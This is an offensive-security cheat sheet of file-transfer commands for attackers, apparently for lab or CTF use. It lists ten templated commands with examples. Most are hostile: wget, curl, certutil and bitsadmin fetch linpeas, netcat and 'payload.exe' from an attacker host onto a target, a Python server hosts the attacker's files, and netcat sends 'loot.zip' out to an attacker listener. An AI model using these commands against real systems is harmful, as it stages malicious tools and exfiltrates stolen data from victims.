
---
Description :
     Python3 upload server (attacker serves files)

Parameters : #attacker-port #directory

```cmd
cd {{directory}} && python3 -m http.server {{attacker-port}} --bind 0.0.0.0
```

```example
cd /tmp/share && python3 -m http.server 8000 --bind 0.0.0.0
```

Tags :  #linux #transfer #http #toolkit

---

Description :
     wget download single file

Parameters : #url #file

```cmd
wget "{{url}}" -O {{file}}
```

```example
wget "http://10.10.14.2:8000/linpeas.sh" -O /tmp/l.sh
```

Tags :  #linux #wget #transfer #toolkit

---

Description :
     curl download binary silent

Parameters : #url #file

```cmd
curl -sSL "{{url}}" -o {{file}}
```

```example
curl -sSL "http://10.10.14.2/nc" -o /tmp/nc
```

Tags :  #linux #curl #transfer #toolkit

---

Description :
     Windows certutil download (URL must be http/https)

Parameters : #url #file

```cmd
certutil -urlcache -split -f "{{url}}" {{file}}
```

```example
certutil -urlcache -split -f "http://10.10.14.2/nc.exe" C:\Temp\nc.exe
```

Tags :  #windows #certutil #transfer #toolkit

---

Description :
     Windows bitsadmin download (legacy)

Parameters : #url #file

```cmd
bitsadmin /transfer j /download /priority high "{{url}}" {{file}}
```

```example
bitsadmin /transfer j /download /priority high "http://10.10.14.2/payload.exe" C:\Temp\p.exe
```

Tags :  #windows #bitsadmin #transfer #toolkit

---

Description :
     SMB client get file from share (Linux)

Parameters : #target-ip #username #file

```cmd
smbclient //{{target-ip}}/share -U {{username}} -c "get {{file}}"
```

```example
smbclient //10.10.10.10/data -U guest -c "get notes.txt"
```

Tags :  #linux #smb #transfer #toolkit

---

Description :
     SCP push file to remote (from attacker)

Parameters : #file #username #target-ip #directory

```cmd
scp {{file}} {{username}}@{{target-ip}}:{{directory}}
```

```example
scp ./tool.sh kali@10.10.14.1:/tmp/
```

Tags :  #linux #scp #transfer #toolkit

---

Description :
     Base64 decode to file (paste blob)

Parameters : #file

```cmd
base64 -d <<< "$(cat)" > {{file}}
```

```example
base64 -d <<< "SGVsbG8=" > /tmp/out
```

Tags :  #linux #base64 #transfer #toolkit

---

Description :
     nc file receive (listen then redirect)

Parameters : #attacker-port #file

```cmd
nc -lvnp {{attacker-port}} > {{file}}
```

```example
nc -lvnp 4445 > received.bin
```

Tags :  #linux #nc #transfer #toolkit

---

Description :
     nc file send to listener

Parameters : #attacker-ip #attacker-port #file

```cmd
nc {{attacker-ip}} {{attacker-port}} < {{file}}
```

```example
nc 10.10.14.2 4445 < loot.zip
```

Tags :  #linux #nc #transfer #toolkit

---
